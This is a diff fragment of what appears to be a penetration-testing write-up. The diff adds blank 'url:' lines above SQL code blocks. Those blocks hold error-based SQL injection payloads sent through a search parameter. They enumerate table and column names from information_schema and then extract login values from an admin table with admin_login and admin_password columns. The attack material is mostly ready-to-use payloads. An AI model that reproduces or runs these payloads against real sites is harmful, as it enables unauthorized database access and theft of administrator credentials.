@@ -56,6 +56,8 @@ It was really sad, as the ammount of adrenalin in blood was already too high. Af
 
 Getting Table Results
 
+url: 
+
 ```sql
 search/?1' or(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(table_name as char)),0x27,0x7e) FROM information_schema 0.e.tables Where table_schema=0xDATABASE_NAME_IN_HEX limit 1,1)) from information_schema 0.e.tables limit 0,1),floor(rand(0)*2))x from information_schema 0.e.tables group by x)a) and '1'='1
 ```
@@ -67,6 +69,8 @@ Click-Method and mighty hands method resulted in discovering about 95 tables, af
 ### Let’s start from the tt_admin_lists. ( We need to get column names, then by table name and column name get value again one by one )
 Getting Column Names:
 
+url: 
+
 ```sql
 search/?1' or(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(column_name as char)),0x27,0x7e) FROM information_schema 0.e.columns  Where table_schema=0xDATABASE_NAME_IN_ HEX AND table_name=0xTABLE_NAME_IN_HEX limit 1,1)) from information_schema 0.e.tables limit 0,1),floor(rand(0)*2))x from information_schema 0.e.tables group by x)a) and '1'='1
 ```
@@ -76,6 +80,8 @@ Here is Result:
 `admin _id, admin_login, admin_password`
 
 Getting column data:
+
+url: 
 
 ```sql
 search/?1' or(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,Hex(cast(tt_admin_lists.admin_login as char)),0x27,0x7e) FROM `DATABASE_NAME`. tt_admin_lists LIMIT 1,1) ) from information_schema 0.e.tables limit 0,1),floor(rand(0)*2))x from information_schema 0.e.tables group by x)a) and '1'='1
